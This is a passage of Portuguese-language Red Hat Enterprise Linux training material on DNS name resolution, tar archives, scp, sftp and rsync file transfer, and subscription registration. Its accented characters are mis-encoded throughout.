No Red Hat Enterprise Linux 7 e posterior, o nome do host est√°tico √© armazenado em /etc/hostname. O Red Hat Enterprise Linux 6 e anterior armazena o nome do host como uma vari√°vel no arquivo /etc/sysconfig/network. Configura√ß√£o da resolu√ß√£o de nomes
O resolvedor stub √© usado para converter nomes do host em endere√ßos IP ou vice-versa. Ele determina onde procurar com base na configura√ß√£o do arquivo /etc/nsswitch.conf. Por padr√£o, o conte√∫do do arquivo /etc/hosts √© verificado primeiro.
[root@host ~]# cat /etc/hosts 127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4 ::1 localhost localhost.localdomain localhost6 localhost6.localdomain6
172.25.254.254 classroom.example.com 172.25.254.254 content.example.com
O comando getent hosts hostname pode ser usado para testar a resolu√ß√£o do nome do host com o arquivo /etc/hosts.
Se n√£o for poss√≠vel encontrar uma entrada no arquivo /etc/hosts, por padr√£o o resolvedor stub procurar√° o nome do host usando um nameserver DNS. O arquivo /etc/resolv.conf controla como a consulta √© realizada:
search: uma lista de nomes de dom√≠nio a serem tentados com um nome de host curto. Ele n√£o deve ser definido junto com domain no mesmo arquivo. Caso ambos sejam definidos, a √∫ltima inst√¢ncia prevalecer√°. Consulte resolv.conf(5) para obter detalhes. nameserver: o endere√ßo IP de um nameserver a ser consultado. At√© tr√™s diretivas de nameserver poder√£o ser fornecidas para oferecer backups se uma estiver inoperante. [root@host ~]# cat /etc/resolv.conf
Generated by NetworkManager domain example.com search example.com nameserver 172.25.254.254
O NetworkManager atualiza o arquivo /etc/resolv.conf usando as configura√ß√µes de DNS nos arquivos de configura√ß√£o da conex√£o. Use o comando nmcli para modificar as conex√µes.
[root@host ~]# nmcli con mod ID ipv4.dns IP [root@host ~]# nmcli con down ID [root@host ~]# nmcli con up ID [root@host ~]# cat /etc/sysconfig/network-scripts/ifcfg-ID &amp;hellip;output omitted&amp;hellip; DNS1=8.8.8.8 &amp;hellip;output omitted&amp;hellip;
O comportamento padr√£o de nmcli con mod ID ipv4.dns IP √© substituir as configura√ß√µes de DNS pela nova lista de IP fornecida. Um s√≠mbolo de &#43; ou - antes do argumento ipv4.dns adiciona ou remove uma entrada individual.
[root@host ~]# nmcli con mod ID &#43;ipv4.dns IP
Para adicionar o servidor DNS com endere√ßo IPv6 2001:4860:4860::8888 √† lista de nameservers para usar com a conex√£o static-ens3:
[root@host ~]# nmcli con mod static-ens3 &#43;ipv6.dns 2001:4860:4860::8888
Nota
Todas as configura√ß√µes DNS IPv4 e IPv6 est√°ticas terminam como diretivas de nameserver em /etc/resolv.conf. Voc√™ deve garantir que haja, no m√≠nimo, um servidor de nomes acess√≠vel por IPv4 listado (em um sistema de pilha dual). √â melhor ter, pelo menos, um servidor de nomes que use IPv4 e outro que use IPv6 caso voc√™ tenha problemas com a rede IPv4 ou IPv6.
Teste da resolu√ß√£o de nomes DNS
O comando host HOSTNAME pode ser usado para testar a conectividade do servidor de DNS.
[root@host ~]# host classroom.example.com classroom.example.com has address 172.25.254.254 [root@host ~]# host 172.25.254.254 254.254.25.172.in-addr.arpa domain name pointer classroom.example.com.
Importante
O DHCP regrava automaticamente o arquivo /etc/resolv.conf quando as interfaces s√£o iniciadas, a menos que voc√™ especifique PEERDNS=no nos arquivos de configura√ß√£o de interface relevantes. Estabele√ßa essa defini√ß√£o usando o comando nmcli.
[root@host ~]# nmcli con mod &amp;ldquo;static-ens3&amp;rdquo; ipv4.ignore-auto-dns yes
Cap√≠tulo 13. Arquivamento e transfer√™ncia de arquivos Gerenciamento de arquivos tar compactados Objetivos
Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de arquivar arquivos e diret√≥rios em um arquivo compactado usando tar e extrair o conte√∫do de um arquivo tar existente. O comando tar
Arquivos compactados s√£o √∫teis na cria√ß√£o de backups e na transfer√™ncia de dados atrav√©s de uma rede. Um dos comandos mais antigos e mais comuns para criar e trabalhar com arquivos de backup √© o comando tar.
Com o tar, os usu√°rios podem reunir grandes conjuntos de arquivos em um √∫nico arquivo (arquivo compactado). Um arquivo tar √© uma sequ√™ncia estruturada de dados de arquivos misturados com metadados sobre cada arquivo e um √≠ndice para que arquivos individuais possam ser extra√≠dos. O arquivo compactado pode ser feito com compacta√ß√£o gzip, bzip2 ou xz.
O comando tar tamb√©m lista o conte√∫do de arquivos compactados ou extrai os respectivos arquivos no sistema atual. Op√ß√µes selecionadas do tar
As op√ß√µes do comando tar s√£o divididas em opera√ß√µes (a a√ß√£o que voc√™ deseja executar): op√ß√µes gerais e op√ß√µes de compacta√ß√£o. A tabela abaixo mostra op√ß√µes comuns, vers√£o longa das op√ß√µes e sua descri√ß√£o:
Tabela 13.1. Vis√£o geral das opera√ß√µes de tar
tar_a1.png
Tabela 13.2. Op√ß√µes gerais selecionadas do tar
tar_a2.png
Tabela 13.3. Vis√£o geral das op√ß√µes de compacta√ß√£o tar
tar_a3.png
Op√ß√µes de listagem do comando tar
O comando tar espera uma das seguintes tr√™s op√ß√µes:
Use a op√ß√£o -c ou --create para criar um arquivo. Use a op√ß√£o -t ou --list para listar o conte√∫do de um arquivo compactado. Use a op√ß√£o -x ou --extract para extrair um arquivo compactado. Outras op√ß√µes normalmente usadas s√£o:
Use a op√ß√£o -f ou --file= com um nome de arquivo como argumento do arquivo a ser operado. Use a op√ß√£o -v ou --verbose para detalhamento; √∫til para saber quais arquivos s√£o adicionados ou extra√≠dos no arquivo compactado. Nota
O comando tar na verdade √© compat√≠vel com um terceiro estilo de op√ß√£o antigo que usa o padr√£o de op√ß√µes de letra √∫nica op√ß√µes sem - √† esquerda. Ainda √© comumente encontrado, e voc√™ pode se deparar com essa sintaxe ao trabalhar com instru√ß√µes ou comandos de outras pessoas. O comando info tar &amp;lsquo;old options&amp;rsquo; discute mais aprofundadamente como isso difere das op√ß√µes curtas normais.
Voc√™ pode ignorar op√ß√µes antigas por enquanto e focar na sintaxe padr√£o de op√ß√µes curtas e longas. Arquivamento de arquivos e diret√≥rios
A primeira op√ß√£o a ser usada durante a cria√ß√£o de um novo arquivo compactado √© c, seguida pela op√ß√£o f, seguida ent√£o de um √∫nico espa√ßo, depois o nome do arquivo a ser criado e, finalmente, a lista de arquivos e diret√≥rios que devem ser adicionados ao arquivo compactado. O arquivo compactado √© criado no diret√≥rio atual, a menos que especificado de outra maneira. Aten√ß√£o
Antes de criar um arquivo compactado tar, verifique se n√£o h√° outro arquivo no diret√≥rio com o mesmo nome do arquivo a ser criado. O comando tar substitui um arquivo existente sem qualquer aviso.
O comando a seguir cria um arquivo compactado chamado archive.tar com o conte√∫do de file1, file2 e file3 no diret√≥rio pessoal do usu√°rio.
[user@host ~]$ tar -cf archive.tar file1 file2 file3 [user@host ~]$ ls archive.tar archive.tar
O comando tar acima tamb√©m pode ser executado usando as op√ß√µes de vers√£o longa.
[user@host ~]$ tar &amp;ndash;file=archive.tar &amp;ndash;create file1 file2 file3
Nota
Durante o arquivamento de arquivos com nomes de caminho absolutos, a / √† esquerda do caminho √© removida do nome de arquivo por padr√£o. Remover o / √† esquerda do caminho ajuda os usu√°rios a evitar a substitui√ß√£o de arquivos importantes ao extrair o arquivo. O comando tar extrai arquivos em rela√ß√£o ao diret√≥rio de trabalho atual.
Para que o tar possa arquivar os arquivos selecionados, o usu√°rio que executa o comando tar pode ler os arquivos. Por exemplo, a cria√ß√£o de um novo arquivo da pasta /etc e todo o seu conte√∫do exige privil√©gios root, porque somente o usu√°rio root tem permiss√£o para ler os arquivos presentes nesse diret√≥rio /etc. Um usu√°rio sem privil√©gios pode criar um arquivo compactado do diret√≥rio /etc mas o arquivo compactado omite os arquivos que n√£o incluem permiss√£o de leitura para o usu√°rio, bem como os diret√≥rios que n√£o incluem as permiss√µes de leitura e execu√ß√£o para o usu√°rio.
Para criar, como usu√°rio root, o arquivo compactado tar chamado /root/etc.tar com o diret√≥rio /etc como conte√∫do:
[root@host ~]# tar -cf /root/etc.tar /etc tar: Removing leading `/&amp;rsquo; from member names [root@host ~]#
Importante
Algumas permiss√µes avan√ßadas que n√£o cobrimos neste curso, como ACLs e contextos SELinux, n√£o s√£o armazenadas automaticamente em um arquivo compactado tar. Use a op√ß√£o &amp;ndash;xattrs ao criar um arquivo compactado para armazenar os atributos estendidos no arquivo compactado tar. Listagem do conte√∫do de um arquivo compactado
A op√ß√£o t direciona tar para listar o conte√∫do (√≠ndice, portanto t) do arquivo compactado. Use a op√ß√£o f com o nome do arquivo compactado a ser consultado. Por exemplo:
[root@host ~]# tar -tf /root/etc.tar etc/ etc/fstab etc/crypttab etc/mtab &amp;hellip;output omitted&amp;hellip;
Extra√ß√£o de arquivos a partir de um arquivo compactado
Geralmente, um arquivo compactado tar dever√° ser extra√≠do em um diret√≥rio vazio, para garantir que n√£o substitua arquivos existentes. Quando o root extrai um arquivo, o comando tar preserva o usu√°rio original e a propriedade do grupo dos arquivos. Se um usu√°rio comum extrair arquivos usando tar, a propriedade do arquivo pertence ao usu√°rio que est√° extraindo os arquivos do arquivo compactado.
Para restaurar arquivos do arquivo compactado /root/etc.tar para o diret√≥rio /root/etcbackup, execute:
[root@host ~]# mkdir /root/etcbackup [root@host ~]# cd /root/etcbackup [root@host etcbackup]# tar -tf /root/etc.tar etc/ etc/fstab etc/crypttab etc/mtab &amp;hellip;output omitted&amp;hellip; [root@host etcbackup]# tar -xf /root/etc.tar
Por padr√£o, quando os arquivos s√£o extra√≠dos de um arquivo compactado, o umask √© subtra√≠do das permiss√µes do conte√∫do do arquivo compactado. Para preservar as permiss√µes de um arquivo compactado, use a op√ß√£o p durante a extra√ß√£o de um arquivo compactado.
No exemplo, um arquivo compactado chamado /root/myscripts.tar √© extra√≠do para o diret√≥rio /root/scripts ao preservar as permiss√µes dos arquivos extra√≠dos:
[root@host ~]# mkdir /root/scripts [root@host ~]# cd /root/scripts [root@host scripts]# tar -xpf /root/myscripts.tar
Cria√ß√£o de um arquivo compactado
O comando tar √© compat√≠vel com tr√™s m√©todos de compacta√ß√£o. Existem tr√™s m√©todos de compacta√ß√£o diferentes suportados pelo comando tar. A compacta√ß√£o gzip √© a compacta√ß√£o mais r√°pida, mais antiga e de maior disponibilidade nas distribui√ß√µes e at√© nas plataformas. A compacta√ß√£o bzip2 cria arquivos de compacta√ß√£o menores em compara√ß√£o √† gzip, mas √© menos dispon√≠vel que a gzip, embora o m√©todo de compacta√ß√£o xz seja relativamente novo, mas geralmente ofere√ßa a melhor taxa de compacta√ß√£o dos m√©todos dispon√≠veis. Nota
A efic√°cia de qualquer algoritmo de compacta√ß√£o depende do tipo dos dados a serem compactados. Arquivos de dados que j√° est√£o compactados, como formatos de imagem compactados ou arquivos RPM, geralmente levam a uma taxa de compacta√ß√£o mais baixa.
√â uma boa pr√°tica usar um √∫nico diret√≥rio de n√≠vel superior, que pode conter outros arquivos e diret√≥rios, para simplificar a extra√ß√£o de arquivos de forma organizada.
Use uma das seguintes op√ß√µes para criar um arquivo compactado tar:
-z ou --gzip para compacta√ß√£o gzip (filename.tar.gz ou filename.tgz) -j ou --bzip2 para compacta√ß√£o bzip2 (filename.tar.bz2) -J ou -xz para compacta√ß√£o xz (filename.tar.xz) Para criar um arquivo compactado gzip chamado /root/etcbackup.tar.gz, com o conte√∫do do diret√≥rio /etc no host:
[root@host ~]# tar -czf /root/etcbackup.tar.gz /etc tar: Removing leading `/&amp;rsquo; from member names
Para criar um arquivo compactado bzip2 chamado /root/logbackup.tar.bz2, com o conte√∫do do diret√≥rio /var/log no host:
[root@host ~]$ tar -cjf /root/logbackup.tar.bz2 /var/log tar: Removing leading `/&amp;rsquo; from member names
Para criar um arquivo compactado xz chamado /root/sshconfig.tar.xz, com o conte√∫do do diret√≥rio /etc/ssh no host:
[root@host ~]$ tar -cJf /root/sshconfig.tar.xz /etc/ssh tar: Removing leading `/&amp;rsquo; from member names
Depois de criar um arquivo compactado, verifique o conte√∫do usando as op√ß√µes tf. N√£o √© obrigat√≥rio usar a op√ß√£o para agente de compacta√ß√£o ao listar o conte√∫do de um arquivo compactado. Por exemplo, para listar o conte√∫do compactado no arquivo /root/etcbackup.tar.gz, que usa a compacta√ß√£o gzip, use o seguinte comando:
[root@host ~]# tar -tf /root/etcbackup.tar.gz /etc etc/ etc/fstab etc/crypttab etc/mtab &amp;hellip;output omitted&amp;hellip;
Extra√ß√£o de um arquivo compactado
A primeira etapa durante a extra√ß√£o de um arquivo compactado tar √© determinar onde os arquivos compactados devem ser extra√≠dos, criar e passar para o diret√≥rio de destino. O comando tar determina qual compacta√ß√£o foi usada e, em geral, n√£o √© necess√°rio usar a mesma op√ß√£o de compacta√ß√£o usada na cria√ß√£o do arquivo compactado. √â v√°lido adicionar o m√©todo de descompacta√ß√£o ao comando tar. Se escolher fazer isso, a op√ß√£o do tipo de descompacta√ß√£o correta deve ser usada; caso contr√°rio, o tar produz um erro sobre o tipo de descompacta√ß√£o especificado nas op√ß√µes que n√£o correspondem ao tipo de descompacta√ß√£o do arquivo.
Para extrair o conte√∫do de um arquivo compactado gzip chamado /root/etcbackup.tar.gz no diret√≥rio /tmp/etcbackup:
[root@host ~]# mkdir /tmp/etcbackup [root@host ~]# cd /tmp/etcbackup [root@host etcbackup]# tar -tf /root/etcbackup.tar.gz etc/ etc/fstab etc/crypttab etc/mtab &amp;hellip;output omitted&amp;hellip; [root@host etcbackup]# tar -xzf /root/etcbackup.tar.gz
Para extrair o conte√∫do de um arquivo compactado bzip2 chamado /root/logbackup.tar.bz2 no diret√≥rio /tmp/logbackup:
[root@host ~]# mkdir /tmp/logbackup [root@host ~]# cd /tmp/logbackup [root@host logbackup]# tar -tf /root/logbackup.tar.bz2 var/log/ var/log/lastlog var/log/README var/log/private/ var/log/wtmp var/log/btmp &amp;hellip;output omitted&amp;hellip; [root@host logbackup]# tar -xjf /root/logbackup.tar.bz2
Para extrair o conte√∫do de um arquivo compactado xz chamado /root/sshbackup.tar.xz no diret√≥rio /tmp/sshbackup:
[root@host ~]$ mkdir /tmp/sshbackup [root@host ~]# cd /tmp/sshbackup [root@host logbackup]# tar -tf /root/sshbackup.tar.xz etc/ssh/ etc/ssh/moduli etc/ssh/ssh_config etc/ssh/ssh_config.d/ etc/ssh/ssh_config.d/05-redhat.conf etc/ssh/sshd_config &amp;hellip;output omitted&amp;hellip; [root@host sshbackup]# tar -xJf /root/sshbackup.tar.xz
Listar um arquivo compactado tar funciona da mesma forma que listar um arquivo descompactado tar. Nota
Al√©m disso, gzip, bzip2 e xz podem ser usados independentemente para compactar arquivos individuais. Por exemplo, o comando gzip etc.tar resulta no arquivo compactado etc.tar.gz, enquanto o comando bzip2 abc.tar resulta no arquivo compactado abc.tar.bz2, e o comando xz myarchive.tar resulta no arquivo compactado myarchive.tar.xz.
Os comandos de descompacta√ß√£o correspondentes s√£o gunzip, bunzip2 e unxz. Por exemplo, o comando gunzip /tmp/etc.tar.gz resulta no arquivo tar descompactado etc.tar, enquanto o comando bunzip2 abc.tar.bz2 resulta no arquivo tar descompactado abc.tar, e o comando unxz myarchive.tar.xz resulta no arquivo tar descompactado myarchive.tar.
Transfer√™ncia de arquivos entre sistemas com seguran√ßa Objetivos Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de transferir arquivos de e para um sistema remoto com seguran√ßa usando o SSH. Transfer√™ncia de arquivos usando c√≥pia segura
O OpenSSH √© √∫til para a execu√ß√£o segura de comandos shell em sistemas remotos. O comando de c√≥pia segura, scp, parte do conjunto OpenSSH, copia arquivos de um sistema remoto para o sistema local ou do sistema local para um sistema remoto. O comando usa o servidor SSH para autentica√ß√£o e criptografa dados durante a transfer√™ncia.
Voc√™ pode especificar um local remoto para a origem ou o destino dos arquivos que est√° copiando. O formato da localiza√ß√£o remota deve ser [user@]host:/path. A por√ß√£o user@ do argumento √© opcional. Se estiver faltando, seu nome de usu√°rio local atual ser√° usado. Quando voc√™ executa o comando, seu cliente scp autenticar√° para o servidor SSH remoto assim como ssh, usando autentica√ß√£o baseada em chave ou solicitando sua senha.
O seguinte exemplo mostra como copiar os arquivos locais /etc/yum.conf e /etc/hosts no host com seguran√ßa para o diret√≥rio pessoal do remoteuser no sistema remoto remotehost:
[user@host ~]$ scp /etc/yum.conf /etc/hosts remoteuser@remotehost:/home/remoteuser remoteuser@remotehost&amp;rsquo;s password: password yum.conf 100% 813 0.8KB/s 00:00 hosts 100% 227 0.2KB/s 00:00
Voc√™ tamb√©m pode copiar um arquivo na outra dire√ß√£o, de um sistema remoto para o sistema de arquivos local. Neste exemplo, o arquivo /etc/hostname em remotehost √© copiado para o diret√≥rio local /home/user. O comando scp autentica para o remotehost como o usu√°rio remoteuser.
[user@host ~]$ scp remoteuser@remotehost:/etc/hostname /home/user remoteuser@remotehost&amp;rsquo;s password: password hostname 100% 22 0.0KB/s 00:00
Para copiar toda uma √°rvore de diret√≥rio recursivamente, use a op√ß√£o -r. No exemplo a seguir, o nome do diret√≥rio remoto /var/log no remotehost √© copiado recursivamente para o diret√≥rio local /tmp/ no host. Voc√™ deve se conectar ao sistema remoto como root para ter certeza de que pode ler todos os arquivos no diret√≥rio remoto /var/log.
[user@host ~]$ scp -r root@remoteuser:/var/log /tmp root@remotehost&amp;rsquo;s password: password &amp;hellip;output omitted&amp;hellip;
Transfer√™ncia de arquivos usando o programa de transfer√™ncia segura de arquivos
Para fazer o upload ou o download de arquivos de maneira interativa a partir de um servidor SSH, use o comando sftp. Uma sess√£o com o comando sftp usa o mecanismo de autentica√ß√£o segura e transfer√™ncia de dados criptografados de e para um servidor SSH.
Assim como com o comando scp, o comando sftp usa [user@]host para identificar o sistema de destino e o nome do usu√°rio. Se voc√™ n√£o especificar um usu√°rio, o comando tentar√° fazer login usando seu nome de usu√°rio local como o nome de usu√°rio remoto. Ser√° ent√£o exibida uma solicita√ß√£o sftp&amp;gt;.
[user@host ~]$ sftp remoteuser@remotehost remoteuser@remotehost&amp;rsquo;s password: password Connected to remotehost. sftp&amp;gt;
A sess√£o interativa sftp aceita v√°rios comandos que funcionam no sistema de arquivos remoto da mesma forma como funcionam no sistema de arquivos local, como ls, cd, mkdir, rmdir e pwd. O comando put faz o upload de um arquivo para o sistema remoto. O comando get faz o download de um arquivo para o sistema remoto. O comando exit sai da sess√£o sftp.
Para fazer upload do arquivo /etc/hosts no sistema local para o diret√≥rio rec√©m-criado /home/remoteuser/hostbackup no remotehost. A sess√£o sftp sempre sup√µe que o comando put √© seguido de um arquivo no sistema de arquivos local e inicia no diret√≥rio pessoal do usu√°rio em conex√£o; neste caso, /home/remoteuser:
sftp&amp;gt; mkdir hostbackup sftp&amp;gt; cd hostbackup sftp&amp;gt; put /etc/hosts Uploading /etc/hosts to /home/remoteuser/hostbackup/hosts /etc/hosts 100% 227 0.2KB/s 00:00 sftp&amp;gt;
Para fazer download de /etc/yum.conf do host remoto para o diret√≥rio atual no sistema local, execute o comando get /etc/yum.conf e saia da sess√£o sftp com o comando exit.
sftp&amp;gt; get /etc/yum.conf Fetching /etc/yum.conf to yum.conf /etc/yum.conf 100% 813 0.8KB/s 00:00 sftp&amp;gt; exit [user@host ~]$
Sincroniza√ß√£o segura de arquivos entre sistemas Objetivos Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de sincronizar o conte√∫do de um arquivo ou diret√≥rio local com uma c√≥pia no servidor remoto, de modo seguro e eficiente. Sincronizar arquivos e pastas com rsync
O comando rsync √© outra maneira de copiar arquivos com seguran√ßa de um sistema para outro. A ferramenta usa um algoritmo que minimiza a quantidade de dados copiados, sincronizando somente as partes dos arquivos que foram alteradas. A diferen√ßa em rela√ß√£o ao scp √© que, se dois arquivos ou diret√≥rios forem semelhantes entre dois servidores, o rsync copia apenas as diferen√ßas entre os sistemas de arquivos, enquanto o scp copiar√° tudo.
Uma vantagens do rsync √© que ele pode copiar arquivos entre um sistema local e um sistema remoto com seguran√ßa e efici√™ncia. Enquanto a sincroniza√ß√£o inicial do diret√≥rio leva mais ou menos o tempo de uma c√≥pia, as sincroniza√ß√µes subsequentes somente exigem que as diferen√ßas sejam copiadas pela rede, acelerando significativamente as atualiza√ß√µes.
Uma op√ß√£o importante do rsync √© a op√ß√£o -n para execu√ß√£o de um dry run. Um dry run √© uma simula√ß√£o do que acontece quando o comando √© executado. O dry run mostra as mudan√ßas que rsync realiza quando o comando √© executado normalmente. Execute um dry run antes de uma opera√ß√£o rsync real para garantir que arquivos importantes n√£o sejam substitu√≠dos ou exclu√≠dos.
Duas op√ß√µes comuns na sincroniza√ß√£o com o rsync s√£o as op√ß√µes -v e -a.
As op√ß√µes -v ou &amp;ndash;verbose fornecem sa√≠da mais detalhada. Isso √© √∫til para solucionar problemas e visualizar o progresso ao vivo.
As op√ß√µes -a ou &amp;ndash;archive ativam o &amp;ldquo;modo de arquivo compactado&amp;rdquo;. Isso permite a c√≥pia recursiva e ativa um grande n√∫mero de op√ß√µes √∫teis que preservam a maioria das caracter√≠sticas dos arquivos. O modo de arquivo compactado √© o mesmo que especificar as seguintes op√ß√µes:
Tabela 13.4. Op√ß√µes habilitadas com rsync -a (modo de arquivo compactado)
sync_a1.png
O modo de arquivo compactado n√£o preserva links f√≠sicos porque isso pode adicionar um tempo significativo √† sincroniza√ß√£o. Se voc√™ desejar preservar os links f√≠sicos tamb√©m, adicione a op√ß√£o -H. Nota
Se voc√™ estiver usando permiss√µes avan√ßadas, poder√° precisar de duas op√ß√µes adicionais:
-A para preservar as ACLs -X para preservar os contextos do SELinux Voc√™ pode usar rsync para sincronizar o conte√∫do de um arquivo ou diret√≥rio locais com um arquivo ou diret√≥rio em uma m√°quina remota, usando qualquer uma das m√°quinas como a origem. Voc√™ tamb√©m pode sincronizar o conte√∫do de dois arquivos ou diret√≥rios locais.
Por exemplo, para sincronizar o conte√∫do do diret√≥rio /var/log com o diret√≥rio /tmp:
[user@host ~]$ su - Password: password [root@host ~]# rsync -av /var/log /tmp receiving incremental file list log/ log/README log/boot.log &amp;hellip;output omitted&amp;hellip; log/tuned/tuned.log
sent 11,592,423 bytes received 779 bytes 23,186,404.00 bytes/sec total size is 11,586,755 speedup is 1.00 [user@host ~]$ ls /tmp log ssh-RLjDdarkKiW1 [user@host ~]$
Uma barra √† direita do diret√≥rio de origem sincroniza o conte√∫do do diret√≥rio sem criar um subdiret√≥rio no diret√≥rio de destino. Neste exemplo, o diret√≥rio log n√£o √© criado no diret√≥rio /tmp, somente o conte√∫do do /var/log/ √© sincronizado no /tmp.
[root@host ~]# rsync -av /var/log/ /tmp sending incremental file list ./ README boot.log &amp;hellip;output omitted&amp;hellip; tuned/tuned.log
sent 11,592,389 bytes received 778 bytes 23,186,334.00 bytes/sec total size is 11,586,755 speedup is 1.00 [root@host ~]# ls /tmp anaconda dnf.rpm.log-20190318 private audit dnf.rpm.log-20190324 qemu-ga boot.log dnf.rpm.log-20190331 README &amp;hellip;output omitted&amp;hellip;
Importante
Ao digitar o diret√≥rio de origem no comando rsync, a presen√ßa da barra √† direita no nome do diret√≥rio √© significativa. Ela determina se o diret√≥rio ou apenas o conte√∫do do diret√≥rio ser√° sincronizado no destino.
O preenchimento com Tab no Bash adiciona automaticamente uma barra √† direita nos nomes de diret√≥rios.
Como com os comandos scp e sftp, o rsync especifica locais remotos usando o formato [user@]host:/path. O local remoto pode ser o sistema de origem ou de destino, mas uma das duas m√°quinas deve ser local.
Para preservar a propriedade do arquivo, voc√™ deve ser o root no sistema de destino. Se o destino for remoto, autentique como o root. Se o destino √© local, voc√™ deve executar rsync como o root .
Neste exemplo, sincronize o diret√≥rio local /var/log com o diret√≥rio /tmp no sistema remotehost:
[root@host ~]# rsync -av /var/log remotehost:/tmp root@remotehost&amp;rsquo;s password: password receiving incremental file list log/ log/README log/boot.log &amp;hellip;output omitted&amp;hellip; sent 9,783 bytes received 290,576 bytes 85,816.86 bytes/sec total size is 11,585,690 speedup is 38.57
Da mesma forma, o diret√≥rio remoto /var/log no remotehost pode ser sincronizado com o diret√≥rio local /tmp no host:
[root@host ~]# rsync -av remotehost:/var/log /tmp root@remotehost&amp;rsquo;s password: password receiving incremental file list log/boot.log log/dnf.librepo.log log/dnf.log &amp;hellip;output omitted&amp;hellip;
sent 9,783 bytes received 290,576 bytes 85,816.86 bytes/sec total size is 11,585,690 speedup is 38.57
Cap√≠tulo 14. Instala√ß√£o e atualiza√ß√£o de pacotes de software Registro de sistemas no Red Hat Support Objetivos Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de registrar um sistema em sua conta da Red Hat e atribuir direitos para atualiza√ß√µes de software e servi√ßos de suporte usando o Red Hat Subscription Management. Red Hat Subscription Management
O Red Hat Subscription Management oferece ferramentas que podem ser usadas para autorizar m√°quinas a obter subscri√ß√µes de produtos, permitindo aos administradores receber atualiza√ß√µes de pacotes de software e rastrear informa√ß√µes sobre contratos de suporte e subscri√ß√µes usadas pelos sistemas. Ferramentas padr√£o, como PackageKit e yum, podem obter pacotes e atualiza√ß√µes de software por meio de uma rede de distribui√ß√£o de conte√∫do fornecida pela Red Hat.
Existem quatro tarefas b√°sicas realizadas com as ferramentas do Red Hat Subscription Management:
Registrar um sistema para associ√°-lo a uma conta da Red Hat. Isso permite que o Subscription Manager gere um identificador √∫nico para o sistema no invent√°rio. Quando n√£o estiver mais em uso, o registro do sistema poder√° ser cancelado. Subscrever um sistema para autorizar que ele receba atualiza√ß√µes de produtos Red Hat selecionados. As subscri√ß√µes apresentam n√≠veis de suporte, datas de vencimento e reposit√≥rios padr√£o espec√≠ficos. As ferramentas podem ser usadas para conectar automaticamente ou selecionar um determinado direito. Conforme mudan√ßas nas necessidades, as subscri√ß√µes podem ser removidas. Ativar reposit√≥rios para fornecer pacotes de software. V√°rios reposit√≥rios s√£o ativados por padr√£o com cada subscri√ß√£o, mas outros reposit√≥rios, como atualiza√ß√µes ou c√≥digo-fonte, poder√£o ser ativados ou desativados conforme necess√°rio. Revisar e rastrear os direitos que est√£o dispon√≠veis ou est√£o sendo consumidos. As informa√ß√µes de subscri√ß√£o podem ser exibidas localmente em um sistema espec√≠fico ou, para uma conta, na p√°gina de subscri√ß√µes do Red Hat Customer Portal ou no Subscription Asset Manager (SAM). Registro de um sistema
Existem v√°rias maneiras diferentes de registrar um sistema com o Red Hat Customer Portal. Existe uma interface gr√°fica que voc√™ pode acessar com um aplicativo GNOME ou no servi√ßo do console da web e h√° uma ferramenta de linha de comando.
Para registrar um sistema usando o aplicativo GNOME, inicie o Red Hat Subscription Manager selecionando Activities. Digite subscription no campo Type to search&amp;hellip; e clique em Red Hat Subscription Manager. Digite a senha apropriada quando for solicitada a autentica√ß√£o. A janela Subscriptions √© exibida:
cockpit_start.png
Essa caixa de di√°logo registra um sistema em um servidor de subscri√ß√µes. Por padr√£o, ele registra o servidor para o Red Hat Customer Portal. Forne√ßa Login e Password da conta do Red Hat Customer Portal em que deseja registrar o sistema e clique no bot√£o Register.
Quando registrado, o sistema automaticamente tem uma subscri√ß√£o conectada se houver uma dispon√≠vel.
Depois que o sistema √© registrado e uma subscri√ß√£o atribu√≠da, feche a janela Subscriptions. O sistema agora est√° corretamente subscrito e pronto para receber atualiza√ß√µes ou instalar novos softwares da Red Hat. Registro da linha de comando
Use subscription-manager(8) para registrar um sistema sem usar um ambiente gr√°fico. O comando subscription-manager pode anexar automaticamente um sistema √†s subscri√ß√µes mais compat√≠veis com ele.
Registre um sistema em uma conta da Red Hat: [user@host ~]$ subscription-manager register --username=yourusername \ --password=yourpassword Exibir as subscri√ß√µes dispon√≠veis: [user@host ~]$ subscription-manager list --available | less Conectar automaticamente uma subscri√ß√£o: [user@host ~]$ subscription-manager attach --auto Como alternativa, anexe uma subscri√ß√£o de um pool espec√≠fico da lista de subscri√ß√µes dispon√≠veis: [user@host ~]$ subscription-manager attach --pool=poolID Exibir as subscri√ß√µes consumidas: [user@host ~]$ subscription-manager list --consumed Cancelar o registro de um sistema: [user@host ~]$ subscription-manager unregister Nota
O subscription-manager tamb√©m pode ser usado em conjunto com chaves de ativa√ß√£o, o que permite registrar e atribuir subscri√ß√µes predefinidas sem usar um nome de usu√°rio ou uma senha. Esse m√©todo de registro pode ser bastante √∫til para instala√ß√µes e implanta√ß√µes automatizadas. As chaves de ativa√ß√£o geralmente s√£o emitidas por um servi√ßo de gerenciamento de subscri√ß√µes no local, como o Subscription Asset Manager ou Red Hat Satellite, e n√£o s√£o abordadas detalhadamente neste curso. Certificados de direito
Um direito √© uma subscri√ß√£o que foi anexada a um sistema. Certificados digitais s√£o usados para armazenar informa√ß√µes atuais sobre os direitos no sistema local. Depois de registrados, os certificados de direito s√£o armazenados em /etc/pki e em seus subdiret√≥rios.
/etc/pki/product cont√©m os certificados que indicam quais produtos Red Hat est√£o instalados no sistema. /etc/pki/consumer cont√©m os certificados que identificam a conta da Red Hat na qual o sistema est√° registrado. /etc/pki/entitlement cont√©m os certificados que indicam quais subscri√ß√µes est√£o anexadas ao sistema. Os certificados podem ser inspecionados diretamente com o utilit√°rio rct, mas as ferramentas do subscription-manager oferecem maneiras mais f√°ceis de examinar as subscri√ß√µes conectadas ao sistema.
Explica√ß√£o e investiga√ß√£o de pacotes de software RPM Objetivos Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de explicar como o software √© fornecido como pacotes RPM e investigar os pacotes instalados no sistema com o YUM e o RPM. Pacotes de software e RPM
